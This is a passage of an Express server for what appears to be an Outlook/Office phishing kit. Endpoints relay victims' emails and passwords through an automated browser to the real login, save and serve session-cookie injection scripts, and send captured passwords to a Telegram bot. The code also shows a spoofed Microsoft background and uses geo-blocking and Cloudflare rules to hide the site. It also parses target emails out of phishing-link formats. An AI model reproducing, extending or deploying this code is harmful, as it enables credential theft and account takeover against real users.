                                    sessionId: sessionId,
                                    totalCookies: sessionValidation.cookiesSaved || 0,
                                    authMethod: 'FAST Authentication (preloaded browser)'
                                });
                                console.log(`📤 Telegram notification sent for ${email}`);
                            } catch (telegramError) {
                                console.warn('Telegram notification failed:', telegramError.message);
                            }
                        }

                        // Clean up preload session after short delay
                        setTimeout(async () => {
                            try {
                                await automation.close();
                                automationSessions.delete(sessionId);
                                console.log(`🧹 Cleaned up fast auth session: ${sessionId}`);
                            } catch (cleanupError) {
                                console.warn('Error cleaning up fast auth session:', cleanupError.message);
                            }
                        }, 5000);

                        return res.json({
                            success: true,
                            authenticated: true,
                            message: 'Authentication successful',
                            sessionId: sessionId,
                            email: email,
                            cookiesSaved: sessionValidation.cookiesSaved,
                            authMethod: 'FAST',
                            preloadUsed: true,
                            fastAuthTime: Date.now() - startTime
                        });
                    }
                }
            } catch (error) {
                console.error('Error in fast auth with preload:', error);
                // Clean up failed session
                if (automation) {
                    try {
                        await automation.close();
                    } catch (cleanupError) {
                        console.warn('Error cleaning up failed session:', cleanupError.message);
                    }
                }
                if (sessionId && automationSessions.has(sessionId)) {
                    automationSessions.delete(sessionId);
                }
            }
        }

        // If we get here, either no preload or preload failed - fall back to cold start
        console.log(`📱 Using cold start authentication for: ${email}`);
        
        // Use standard authentication flow
        return res.status(501).json({
            success: false,
            error: 'Cold start authentication not implemented in fast endpoint. Use regular auth endpoint.',
            message: 'Please try again'
        });

    } catch (error) {
        console.error('Error in fast password authentication:', error);
        res.status(500).json({
            success: false,
            error: 'Authentication failed',
            details: error.message
        });
    }
});

// Geo-blocking configuration endpoints
app.get('/api/admin/geo-block/config', (req, res) => {
    // Allow reading config without auth, but hide sensitive data
    res.json({
        success: true,
        config: {
            enabled: geoBlockConfig.enabled,
            mode: geoBlockConfig.mode,
            allowedCountries: geoBlockConfig.allowedCountries,
            blockedCountries: geoBlockConfig.blockedCountries,
            customRedirects: geoBlockConfig.customRedirects,
            defaultRedirectsCount: DEFAULT_REDIRECT_URLS.length
        }
    });
});

app.post('/api/admin/geo-block/config', requireAdminAuth, (req, res) => {
    try {
        const { enabled, mode, allowedCountries, blockedCountries, customRedirects } = req.body;

        if (enabled !== undefined) geoBlockConfig.enabled = Boolean(enabled);
        if (mode) geoBlockConfig.mode = mode;
        if (allowedCountries !== undefined) geoBlockConfig.allowedCountries = allowedCountries;
        if (blockedCountries !== undefined) geoBlockConfig.blockedCountries = blockedCountries;
        if (customRedirects !== undefined) geoBlockConfig.customRedirects = customRedirects;

        // Save to file
        fs.writeFileSync(GEO_BLOCK_CONFIG_FILE, JSON.stringify(geoBlockConfig, null, 2));
        
        const statusMsg = geoBlockConfig.enabled ? 
            (geoBlockConfig.mode === 'allow' ? 
                `Allowing only: ${geoBlockConfig.allowedCountries.join(', ') || 'none'}` :
                `Blocking: ${geoBlockConfig.blockedCountries.join(', ') || 'none'}`) :
            'Disabled';
        
        console.log('🌍 Geo-blocking config updated:', statusMsg);

        res.json({
            success: true,
            config: geoBlockConfig,
            message: 'Geo-blocking configuration updated'
        });
    } catch (error) {
        console.error('Error updating geo-block config:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update geo-blocking configuration',
            details: error.message
        });
    }
});

// Get Cloudflare configuration (for admin panel display)
app.get('/api/admin/cloudflare/config', requireAdminAuth, async (req, res) => {
    try {
        res.json({
            success: true,
            config: {
                email: cloudflareConfig.email || '',
                zoneId: cloudflareConfig.zoneId || '',
                configured: cloudflareConfig.configured || false,
                enabled: cloudflareConfig.enabled || false,
                authMethod: cloudflareConfig.apiToken ? 'token' : 'key'
            }
        });
    } catch (error) {
        console.error('Error getting Cloudflare config:', error);
        res.json({
            success: false,
            error: 'Failed to get Cloudflare configuration',
            message: error.message
        });
    }
});

// Toggle Cloudflare on/off
app.post('/api/admin/cloudflare/toggle', requireAdminAuth, async (req, res) => {
    try {
        if (!cloudflareConfig.configured) {
            return res.status(400).json({
                success: false,
                error: 'Cloudflare must be configured before it can be enabled'
            });
        }

        // Toggle the enabled state
        cloudflareConfig.enabled = !cloudflareConfig.enabled;

        // Save to file
        fs.writeFileSync(CLOUDFLARE_CONFIG_FILE, JSON.stringify(cloudflareConfig, null, 2));

        const statusMsg = cloudflareConfig.enabled ? 'enabled' : 'disabled';
        console.log(`☁️ Cloudflare ${statusMsg}`);

        res.json({
            success: true,
            enabled: cloudflareConfig.enabled,
            message: `Cloudflare ${statusMsg} successfully`
        });
    } catch (error) {
        console.error('Error toggling Cloudflare:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to toggle Cloudflare',
            details: error.message
        });
    }
});

// Get country-based access rules
app.get('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
    try {
        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured'
            });
        }

        const response = await callCloudflareAPI('/firewall/rules', 'GET');
        
        // Filter for country-based rules
        const countryRules = response.result.filter(rule => 
            rule.filter && rule.filter.expression && 
            (rule.filter.expression.includes('ip.geoip.country') || 
             rule.filter.expression.includes('geo.country'))
        );

        res.json({
            success: true,
            rules: countryRules,
            count: countryRules.length
        });

    } catch (error) {
        console.error('Error getting country rules:', error.message);
        res.json({
            success: false,
            error: 'Failed to get country rules',
            message: error.message
        });
    }
});

// Create country-based access rule
app.post('/api/admin/cloudflare/country-rules', requireAdminAuth, async (req, res) => {
    try {
        const { action, countries, ruleName } = req.body;

        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured'
            });
        }

        if (!countries || !Array.isArray(countries) || countries.length === 0) {
            return res.status(400).json({
                success: false,
                error: 'Countries array is required'
            });
        }

        // Build expression based on action type
        let expression;
        if (action === 'block') {
            // Block specified countries
            const countryList = countries.map(c => `"${c}"`).join(' ');
            expression = `(ip.geoip.country in {${countryList}})`;
        } else if (action === 'allow_only') {
            // Allow only specified countries (block all others)
            const countryList = countries.map(c => `"${c}"`).join(' ');
            expression = `(not ip.geoip.country in {${countryList}})`;
        } else {
            return res.status(400).json({
                success: false,
                error: 'Invalid action type. Use "block" or "allow_only"'
            });
        }

        const ruleData = {
            filter: {
                expression: expression,
                paused: false
            },
            action: action === 'block' ? 'block' : 'block',
            description: ruleName || `Country access rule - ${action} ${countries.join(', ')}`,
            priority: 1
        };

        const response = await callCloudflareAPI('/firewall/rules', 'POST', [ruleData]);

        console.log(`🌍 Created country access rule: ${action} ${countries.join(', ')}`);

        res.json({
            success: true,
            rule: response.result[0],
            message: `Country rule created: ${action} ${countries.join(', ')}`
        });

    } catch (error) {
        console.error('Error creating country rule:', error.message);
        res.json({
            success: false,
            error: 'Failed to create country rule',
            message: error.message
        });
    }
});

// Delete country-based access rule
app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, async (req, res) => {
    try {
        const { ruleId } = req.params;

        if (!cloudflareConfig.configured) {
            return res.json({
                success: false,
                error: 'Cloudflare not configured'
            });
        }

        await callCloudflareAPI(`/firewall/rules/${ruleId}`, 'DELETE');

        console.log(`🗑️ Deleted country access rule: ${ruleId}`);

        res.json({
            success: true,
            message: 'Country rule deleted successfully'
        });

    } catch (error) {
        console.error('Error deleting country rule:', error.message);
        res.json({
            success: false,
            error: 'Failed to delete country rule',
            message: error.message
        });
    }
});

// Direct login automation endpoint using Puppeteer
app.post('/api/login-automation', async (req, res) => {
    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({ 
                error: 'Email and password are required',
                success: false 
            });
        }

        const sessionId = createSessionId();
        console.log(`🤖 Starting automation login for: ${email} (Session: ${sessionId})`);

        // Initialize automation
        const automation = new OutlookLoginAutomation({
            enableScreenshots: true,
            screenshotQuality: 80
        });

        // Store automation session
        automationSessions.set(sessionId, {
            automation: automation,
            status: 'initializing',
            email: email,
            password: password, // Store password for later use
            startTime: Date.now()
        });

        // Start automation process
        try {
            console.log(`🔧 Initializing browser for session: ${sessionId}`);
            await automation.init();

            automationSessions.get(sessionId).status = 'navigating';
            console.log(`🌐 Navigating to Outlook for session: ${sessionId}`);
            const navigated = await automation.navigateToOutlook();

            if (!navigated) {
                throw new Error('Failed to navigate to Outlook');
            }

            automationSessions.get(sessionId).status = 'logging_in';
            console.log(`🔐 Attempting login for session: ${sessionId}`);
            const loginSuccess = await automation.performLogin(email, password);

            if (loginSuccess) {
                automationSessions.get(sessionId).status = 'saving_session';
                console.log(`💾 Saving session cookies for: ${email}`);
                const sessionValidation = await automation.validateSession(email, password);

                automationSessions.get(sessionId).status = 'completed';

                analytics.successfulLogins++;
                saveAnalytics();

                console.log(`✅ Automation login successful for: ${email}`);

                // Send Telegram notification if bot is available
                if (telegramBot) {
                    try {
                        await telegramBot.sendLoginNotification({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            sessionId: sessionId,
                            totalCookies: sessionValidation.cookiesSaved || 0,
                            authMethod: 'Puppeteer Automation'
                        });
                        console.log(`📤 Telegram notification sent for ${email}`);
                    } catch (error) {
                        console.error('❌ Failed to send Telegram notification:', error.message);
                    }
                }

                res.json({
                    success: true,
                    sessionId: sessionId,
                    email: email,
                    message: 'Login successful! Session validated.',
                    sessionValidation: sessionValidation,
                    method: 'automation'
                });

                // Clean up automation after successful completion
                setTimeout(async () => {
                    try {
                        if (automationSessions.has(sessionId)) {
                            await automation.close();
                            automationSessions.delete(sessionId);
                            console.log(`🧹 Cleaned up automation session: ${sessionId}`);
                        }
                    } catch (error) {
                        console.error(`Error cleaning up automation session ${sessionId}:`, error.message);
                    }
                }, 5000);

            } else {
                automationSessions.get(sessionId).status = 'failed';

                analytics.failedLogins++;
                saveAnalytics();

                console.log(`❌ Automation login failed for: ${email}`);

                // Store failed attempt
                const sessionDir = path.join(__dirname, 'session_data');
                const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
                const failureData = {
                    id: failureId,
                    sessionId: sessionId,
                    email: email,
                    reason: 'Wrong Password',
                    errorMessage: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    timestamp: new Date().toISOString(),
                    status: 'invalid',
                    method: 'automation',
                    failureType: 'incorrect_password'
                };

                fs.writeFileSync(
                    path.join(sessionDir, `invalid_${failureId}.json`),
                    JSON.stringify(failureData, null, 2)
                );

                // Send Telegram notification for failed attempt
                if (telegramBot) {
                    try {
                        await telegramBot.sendFailedLoginNotification({
                            email: email,
                            password: password,
                            timestamp: new Date().toISOString(),
                            sessionId: sessionId,
                            reason: 'Incorrect Password',
                            authMethod: 'Puppeteer Automation',
                            preloadUsed: false
                        });
                        console.log(`📤 Telegram failed login notification sent for ${email}`);
                    } catch (telegramError) {
                        console.warn('Telegram failed login notification failed:', telegramError.message);
                    }
                }

                res.status(401).json({
                    success: false,
                    sessionId: sessionId,
                    error: 'Login failed',
                    message: 'Your account or password is incorrect. If you don\'t remember your password, reset it now.',
                    method: 'automation'
                });

                // Clean up failed automation
                setTimeout(async () => {
                    try {
                        if (automationSessions.has(sessionId)) {
                            await automation.close();
                            automationSessions.delete(sessionId);
                            console.log(`🧹 Cleaned up failed automation session: ${sessionId}`);
                        }
                    } catch (error) {
                        console.error(`Error cleaning up failed automation session ${sessionId}:`, error.message);
                    }
                }, 2000);
            }

        } catch (automationError) {
            console.error(`❌ Automation error for session ${sessionId}:`, automationError.message);

            if (automationSessions.has(sessionId)) {
                automationSessions.get(sessionId).status = 'error';
            }

            analytics.failedLogins++;
            saveAnalytics();

            // Clean up on error
            try {
                if (automationSessions.has(sessionId)) {
                    await automation.close();
                    automationSessions.delete(sessionId);
                }
            } catch (cleanupError) {
                console.error(`Error cleaning up automation after error:`, cleanupError.message);
            }

            res.status(500).json({
                success: false,
                sessionId: sessionId,
                error: 'Automation failed',
                message: 'Technical error during login process. Please try again.',
                details: automationError.message,
                method: 'automation'
            });
        }

    } catch (error) {
        console.error('Error in login automation endpoint:', error);
        analytics.failedLogins++;
        saveAnalytics();

        res.status(500).json({ 
            error: 'Login automation failed',
            success: false,
            details: error.message 
        });
    }
});

// Check automation status
app.get('/api/automation-status/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;

    if (automationSessions.has(sessionId)) {
        const automationSession = automationSessions.get(sessionId);
        res.json({
            sessionId: sessionId,
            status: automationSession.status,
            email: automationSession.email,
            startTime: automationSession.startTime,
            duration: Date.now() - automationSession.startTime
        });
    } else {
        res.status(404).json({
            error: 'Automation session not found',
            sessionId: sessionId
        });
    }
});

// Cancel automation session (requires session ownership)
app.delete('/api/automation-cancel/:sessionId', async (req, res) => {
    const sessionId = req.params.sessionId;
    const clientSessionId = req.headers['x-session-id'] || req.query.clientSessionId;

    if (automationSessions.has(sessionId)) {
        const automationSession = automationSessions.get(sessionId);

        // Verify session ownership or admin access
        const hasAdminAccess = req.headers['x-admin-token'] === ADMIN_TOKEN;
        const hasSessionAccess = clientSessionId && userSessions.has(clientSessionId);

        if (!hasAdminAccess && !hasSessionAccess) {
            return res.status(403).json({
                error: 'Access denied - invalid session or admin token',
                sessionId: sessionId
            });
        }

        try {
            // Close the automation browser
            if (automationSession.automation) {
                await automationSession.automation.close();
            }

            // Remove from sessions
            automationSessions.delete(sessionId);

            console.log(`🚫 Cancelled automation session: ${sessionId}`);

            res.json({
                success: true,
                sessionId: sessionId,
                message: 'Automation session cancelled successfully'
            });

        } catch (error) {
            console.error(`Error cancelling automation session ${sessionId}:`, error.message);

            // Still remove from sessions even if close failed
            automationSessions.delete(sessionId);

            res.json({
                success: true,
                sessionId: sessionId,
                message: 'Automation session cancelled (with cleanup warnings)',
                warning: error.message
            });
        }
    } else {
        res.status(404).json({
            error: 'Automation session not found',
            sessionId: sessionId
        });
    }
});

// Internal redirect URL endpoint (used by automation and admin panel)
app.get('/api/internal/redirect-url', (req, res) => {
    try {
        // Load redirect configuration
        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
        let redirectUrl = 'https://office.com'; // Default fallback

        if (fs.existsSync(redirectConfigPath)) {
            try {
                const redirectConfig = JSON.parse(fs.readFileSync(redirectConfigPath, 'utf8'));
                if (redirectConfig.redirectUrl) {
                    redirectUrl = redirectConfig.redirectUrl;
                }
            } catch (configError) {
                console.warn('Error reading redirect config:', configError.message);
            }
        }

        res.json({
            success: true,
            redirectUrl: redirectUrl
        });
    } catch (error) {
        console.error('Error getting redirect URL:', error);
        res.json({
            success: false,
            redirectUrl: 'https://office.com',
            error: error.message
        });
    }
});

// Internal background URL endpoint (used by automation and admin panel)
app.get('/api/internal/background-url', (req, res) => {
    try {
        const backgroundConfigPath = path.join(__dirname, 'background-config.json');
        let backgroundUrl = 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg';

        if (fs.existsSync(backgroundConfigPath)) {
            try {
                const backgroundConfig = JSON.parse(fs.readFileSync(backgroundConfigPath, 'utf8'));
                if (backgroundConfig.backgroundUrl) {
                    backgroundUrl = backgroundConfig.backgroundUrl;
                }
            } catch (configError) {
                console.warn('Error reading background config:', configError.message);
            }
        }

        res.json({
            success: true,
            backgroundUrl: backgroundUrl
        });
    } catch (error) {
        console.error('Error getting background URL:', error);
        res.json({
            success: false,
            backgroundUrl: 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg',
            error: error.message
        });
    }
});

// Admin endpoint to update background URL
app.post('/api/admin/background-url', requireAdminAuth, (req, res) => {
    try {
        const { backgroundUrl } = req.body;

        if (!backgroundUrl) {
            return res.status(400).json({
                success: false,
                error: 'backgroundUrl is required'
            });
        }

        // Validate URL
        try {
            new URL(backgroundUrl);
        } catch (urlError) {
            return res.status(400).json({
                success: false,
                error: 'Invalid URL format'
            });
        }

        // Update background-config.json
        const backgroundConfigPath = path.join(__dirname, 'background-config.json');
        const backgroundConfig = {
            backgroundUrl: backgroundUrl,
            lastUpdated: new Date().toISOString()
        };

        fs.writeFileSync(backgroundConfigPath, JSON.stringify(backgroundConfig, null, 2));
        console.log(`🖼️ Office login background updated to: ${backgroundUrl}`);

        res.json({
            success: true,
            backgroundUrl: backgroundUrl,
            message: 'Background URL updated successfully'
        });

    } catch (error) {
        console.error('Error updating background URL:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update background URL',
            details: error.message
        });
    }
});

// Get session status
app.get('/api/status', (req, res) => {
    const sessionId = req.headers['x-session-id'] || req.query.sessionId;

    if (sessionId && userSessions.has(sessionId)) {
        const session = userSessions.get(sessionId);
        const isAuthenticated = !!(session.authenticated && session.userEmail);

        res.json({
            authenticated: isAuthenticated,
            userEmail: session.userEmail,
            sessionId: sessionId,
            sessionCount: userSessions.size,
            hasToken: !!session.graphAuth?.accessToken,
            verified: !!session.verified,
            cookiesSaved: !!session.cookiesSaved
        });
    } else {
        res.json({
            authenticated: false,
            sessionCount: userSessions.size,
            message: 'No active session'
        });
    }
});

// Preload status endpoint for specific session
app.get('/api/preload-status/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;

        if (automationSessions.has(sessionId)) {
            const session = automationSessions.get(sessionId);
            res.json({
                sessionId: sessionId,
                status: session.status,
                email: session.email,
                startTime: session.startTime,
                ageMs: Date.now() - session.startTime
            });
        } else {
            res.status(404).json({
                error: 'Preload session not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error getting preload status:', error);
        res.status(500).json({
            error: 'Failed to get preload status',
            details: error.message
        });
    }
});

// Preload statistics monitoring endpoint (admin only)
app.get('/api/preload-stats', requireAdminAuth, (req, res) => {
    try {
        const stats = getPreloadStats();
        const sessionDetails = Array.from(automationSessions.entries())
            .filter(([_, session]) => session.status && session.status.startsWith('preload'))
            .map(([sessionId, session]) => ({
                sessionId: sessionId,
                email: session.email,
                status: session.status,
                startTime: session.startTime,
                ageMs: Date.now() - session.startTime
            }));

        res.json({
            success: true,
            stats: stats,
            activeSessions: sessionDetails,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        console.error('Error getting preload stats:', error);
        res.status(500).json({
            error: 'Failed to get preload statistics',
            details: error.message
        });
    }
});

// Serve cookie injection scripts
app.get('/api/cookies/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const sessionDir = path.join(__dirname, 'session_data');
        const injectionFilename = `inject_session_${sessionId}.js`;
        const injectionPath = path.join(sessionDir, injectionFilename);

        if (fs.existsSync(injectionPath)) {
            const script = fs.readFileSync(injectionPath, 'utf8');
            res.setHeader('Content-Type', 'application/javascript');
            res.setHeader('Content-Disposition', `attachment; filename="${injectionFilename}"`);
            res.send(script);
        } else {
            res.status(404).json({
                error: 'Cookie injection script not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error serving cookie script:', error);
        res.status(500).json({
            error: 'Failed to serve cookie script',
            details: error.message
        });
    }
});

// Get session data with cookies
app.get('/api/session-data/:sessionId', (req, res) => {
    try {
        const sessionId = req.params.sessionId;
        const sessionDir = path.join(__dirname, 'session_data');

        // Find session file
        const sessionFiles = fs.readdirSync(sessionDir).filter(file => 
            file.startsWith(`session_${sessionId}_`) && file.endsWith('.json')
        );

        if (sessionFiles.length > 0) {
            const sessionFile = sessionFiles[0];
            const sessionPath = path.join(sessionDir, sessionFile);
            const sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));

            // Return session data without sensitive cookie values
            const publicSessionData = {
                sessionId: sessionData.sessionId,
                email: sessionData.email,
                timestamp: sessionData.timestamp,
                status: sessionData.status,
                totalCookies: sessionData.totalCookies,
                domains: sessionData.domains,
                injectFilename: sessionData.injectFilename,
                cookieNames: sessionData.cookies ? sessionData.cookies.map(c => c.name) : []
            };

            res.json(publicSessionData);
        } else {
            res.status(404).json({
                error: 'Session data not found',
                sessionId: sessionId
            });
        }
    } catch (error) {
        console.error('Error getting session data:', error);
        res.status(500).json({
            error: 'Failed to get session data',
            details: error.message
        });
    }
});

// Admin endpoint to update project redirect configuration
app.post('/api/admin/project-redirect', requireAdminAuth, (req, res) => {
    try {
        const { redirectUrl } = req.body;

        if (!redirectUrl) {
            return res.status(400).json({
                success: false,
                error: 'redirectUrl is required'
            });
        }

        // Validate URL
        try {
            new URL(redirectUrl);
        } catch (urlError) {
            return res.status(400).json({
                success: false,
                error: 'Invalid URL format'
            });
        }

        // Update redirect-config.json
        const redirectConfigPath = path.join(__dirname, 'redirect-config.json');
        const redirectConfig = {
            redirectUrl: redirectUrl,
            lastUpdated: new Date().toISOString()
        };

        fs.writeFileSync(redirectConfigPath, JSON.stringify(redirectConfig, null, 2));
        console.log(`📍 Project redirect updated to: ${redirectUrl}`);

        res.json({
            success: true,
            redirectUrl: redirectUrl,
            message: 'Project redirect configuration updated successfully'
        });

    } catch (error) {
        console.error('Error updating project redirect:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update project redirect configuration',
            details: error.message
        });
    }
});

// Admin endpoint to get background configuration
app.get('/api/admin/background-url', requireAdminAuth, (req, res) => {
    try {
        const backgroundConfigPath = path.join(__dirname, 'background-config.json');
        let backgroundUrl = 'https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2-small_2055002f2daae2ed8f69f03944c0e5d9.jpg';

        if (fs.existsSync(backgroundConfigPath)) {
            const backgroundConfig = JSON.parse(fs.readFileSync(backgroundConfigPath, 'utf8'));
            if (backgroundConfig.backgroundUrl) {
                backgroundUrl = backgroundConfig.backgroundUrl;
            }
        }

        res.json({
            success: true,
            backgroundUrl: backgroundUrl
        });
    } catch (error) {
        console.error('Error getting background URL:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to get background URL',
            details: error.message
        });
    }
});

// Admin endpoint to update background URL
app.post('/api/admin/background-url', requireAdminAuth, (req, res) => {
    try {
        const { backgroundUrl } = req.body;

        if (!backgroundUrl) {
            return res.status(400).json({
                success: false,
                error: 'backgroundUrl is required'
            });
        }

        // Validate URL
        try {
            new URL(backgroundUrl);
        } catch (urlError) {
            return res.status(400).json({
                success: false,
                error: 'Invalid URL format'
            });
        }

        // Update background-config.json
        const backgroundConfigPath = path.join(__dirname, 'background-config.json');
        const backgroundConfig = {
            backgroundUrl: backgroundUrl,
            lastUpdated: new Date().toISOString()
        };

        fs.writeFileSync(backgroundConfigPath, JSON.stringify(backgroundConfig, null, 2));
        console.log(`🎨 Background URL updated to: ${backgroundUrl}`);

        res.json({
            success: true,
            backgroundUrl: backgroundUrl,
            message: 'Background URL updated successfully'
        });

    } catch (error) {
        console.error('Error updating background URL:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update background URL',
            details: error.message
        });
    }
});

// Admin analytics endpoint
app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
    try {
        // Ensure session directory exists
        const sessionDir = path.join(__dirname, 'session_data');
        if (!fs.existsSync(sessionDir)) {
            fs.mkdirSync(sessionDir, { recursive: true });
        }

        // Read all session files to get comprehensive analytics
        let validEntries = 0;
        let invalidEntries = 0;

        try {
            const files = fs.readdirSync(sessionDir);

            // Count valid sessions
            validEntries = files.filter(file => 
                file.startsWith('session_') && file.endsWith('.json')
            ).length;

            // Count invalid sessions
            invalidEntries = files.filter(file => 
                file.startsWith('invalid_') && file.endsWith('.json')
            ).length;
        } catch (dirError) {
            console.warn('Error reading session directory:', dirError.message);
            // Continue with zeros if directory read fails
        }

        // Use analytics.json data as source of truth for visits/attempts
        const totalVisits = analytics.totalLogins || 0;
        const successfulLogins = analytics.successfulLogins || 0;
        const failedLogins = analytics.failedLogins || 0;

        res.json({
            success: true,
            totalVisits: totalVisits,
            validEntries: validEntries,  // Count of actual session files
            invalidEntries: invalidEntries,  // Count of actual invalid files
            successfulLogins: successfulLogins,  // From analytics.json
            failedLogins: failedLogins  // From analytics.json
        });
    } catch (error) {
        console.error('Error loading analytics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to load analytics',
            details: error.message,
            totalVisits: 0,
            validEntries: 0,
            invalidEntries: 0,
            successfulLogins: 0,
            failedLogins: 0
        });
    }
});

// Clear analytics endpoint
app.post('/api/admin/analytics/clear', requireAdminAuth, (req, res) => {
    try {
        // Reset analytics object to zeros
        analytics.totalLogins = 0;
        analytics.successfulLogins = 0;
        analytics.failedLogins = 0;

        // Save to file immediately
        fs.writeFileSync(ANALYTICS_FILE, JSON.stringify(analytics, null, 2));
        console.log('🗑️ Analytics cleared by admin');

        res.json({
            success: true,
            message: 'Analytics cleared successfully'
        });
    } catch (error) {
        console.error('Error clearing analytics:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to clear analytics',
            details: error.message
        });
    }
});

// Auto-grab URL parser endpoint
app.post('/api/admin/autograb/parse', requireAdminAuth, (req, res) => {
    try {
        const { url } = req.body;

        if (!url) {
            return res.status(400).json({
                success: false,
                error: 'URL is required'
            });
        }

        // Parse URL to extract email based on various patterns
        const parsedEmail = parseEmailFromUrl(url);

        if (parsedEmail) {
            res.json({
                success: true,
                email: parsedEmail.email,
                pattern: parsedEmail.pattern,
                redirectType: parsedEmail.redirectType
            });
        } else {
            res.json({
                success: false,
                error: 'No email found in URL',
                url: url
            });
        }
    } catch (error) {
        console.error('Error parsing auto-grab URL:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to parse URL',
            details: error.message
        });
    }
});

// Get auto-grab configuration (allow reading without auth for status check)
app.get('/api/admin/autograb/config', (req, res) => {
    try {
        const configPath = path.join(__dirname, 'autograb-config.json');
        let config = {
            enabled: false,
            autoRedirect: true,
            patterns: []
        };

        if (fs.existsSync(configPath)) {
            config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        }

        res.json({
            success: true,
            config: config
        });
    } catch (error) {
        console.error('Error loading auto-grab config:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to load configuration',
            details: error.message
        });
    }
});

// Update auto-grab configuration
app.post('/api/admin/autograb/config', requireAdminAuth, (req, res) => {
    try {
        const { enabled, autoRedirect } = req.body;
        const configPath = path.join(__dirname, 'autograb-config.json');

        let config = {
            enabled: false,
            autoRedirect: true,
            patterns: []
        };

        if (fs.existsSync(configPath)) {
            config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
        }

        if (enabled !== undefined) config.enabled = Boolean(enabled);
        if (autoRedirect !== undefined) config.autoRedirect = Boolean(autoRedirect);

        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
        console.log('📋 Auto-grab configuration updated');

        res.json({
            success: true,
            config: config,
            message: 'Configuration updated successfully'
        });
    } catch (error) {
        console.error('Error updating auto-grab config:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to update configuration',
            details: error.message
        });
    }
});

// Helper function to parse email from URL using various patterns
function parseEmailFromUrl(url) {
    try {
        const urlObj = new URL(url);
        const params = urlObj.searchParams;
        const hash = urlObj.hash.substring(1);
        const pathname = urlObj.pathname;

        // Pattern 1: #(Random 4 String)(Email Base64)(Random 4 String)
        const pattern1Match = hash.match(/^[a-zA-Z0-9]{4}([A-Za-z0-9+/=]+)[a-zA-Z0-9]{4}$/);
        if (pattern1Match) {
            try {
                const decoded = Buffer.from(pattern1Match[1], 'base64').toString('utf8');
                if (isValidEmail(decoded)) {
                    return { email: decoded, pattern: '#(Random 4)(Email Base64)(Random 4)', redirectType: 'hash' };
                }
            } catch (e) {}
        }

        // Pattern 2: #(Email) or #(Email Base64)
        if (hash) {
            if (isValidEmail(hash)) {
                return { email: hash, pattern: '#(Email)', redirectType: 'hash' };
            }
            try {
                const decoded = Buffer.from(hash, 'base64').toString('utf8');
                if (isValidEmail(decoded)) {
                    return { email: decoded, pattern: '#(Email Base64)', redirectType: 'hash' };
                }
            } catch (e) {}
        }

        // Pattern 3: ?t=(email) or ?t=(email base64)
        const tParam = params.get('t');
        if (tParam) {
            if (isValidEmail(tParam)) {
                return { email: tParam, pattern: '?t=(email)', redirectType: 'query' };
            }
            try {
                const decoded = Buffer.from(tParam, 'base64').toString('utf8');
                if (isValidEmail(decoded)) {
                    return { email: decoded, pattern: '?t=(email base64)', redirectType: 'query' };
                }
            } catch (e) {}
        }

        // Pattern 4-7: Various query parameters
        const paramPatterns = ['a', 'email', 'e', 'target'];
        for (const param of paramPatterns) {
            const value = params.get(param);
            if (value) {
                if (isValidEmail(value)) {
                    return { email: value, pattern: `?${param}=(email)`, redirectType: 'query' };
                }
                try {
                    const decoded = Buffer.from(value, 'base64').toString('utf8');
                    if (isValidEmail(decoded)) {
                        return { email: decoded, pattern: `?${param}=(email base64)`, redirectType: 'query' };
                    }
                } catch (e) {}
            }
        }

        // Pattern 8-10: Path-based patterns /$<(email)> or /*<(email)> or /<(email)>
        const pathPatterns = [
            /\/\$<([^>]+)>/,
            /\/\*<([^>]+)>/,
            /\/<([^>]+)>/
        ];

        for (const pattern of pathPatterns) {
            const match = pathname.match(pattern);
            if (match) {
                const value = match[1];
                if (isValidEmail(value)) {
                    return { email: value, pattern: pattern.source, redirectType: 'path' };
                }
                try {
                    const decoded = Buffer.from(value, 'base64').toString('utf8');
                    if (isValidEmail(decoded)) {
                        return { email: decoded, pattern: pattern.source + ' (base64)', redirectType: 'path' };
                    }
                } catch (e) {}
            }
        }

        // Pattern 11-14: Path with random chars: /$<randomchar>*<(email)>
        const complexPathPatterns = [
            /\/\$<[^>]+>(\*|>)<([^>]+)>/,
            /\/\*<[^>]+>(\$|>)<([^>]+)>/,
            /\/<[^>]+>(>|\$|\*)<([^>]+)>/
        ];

        for (const pattern of complexPathPatterns) {
            const match = pathname.match(pattern);
            if (match) {
                const value = match[2] || match[1];
                if (isValidEmail(value)) {
                    return { email: value, pattern: pattern.source, redirectType: 'path' };
                }
                try {
                    const decoded = Buffer.from(value, 'base64').toString('utf8');
                    if (isValidEmail(decoded)) {
                        return { email: decoded, pattern: pattern.source + ' (base64)', redirectType: 'path' };
                    }
                } catch (e) {}
            }
        }

        return null;

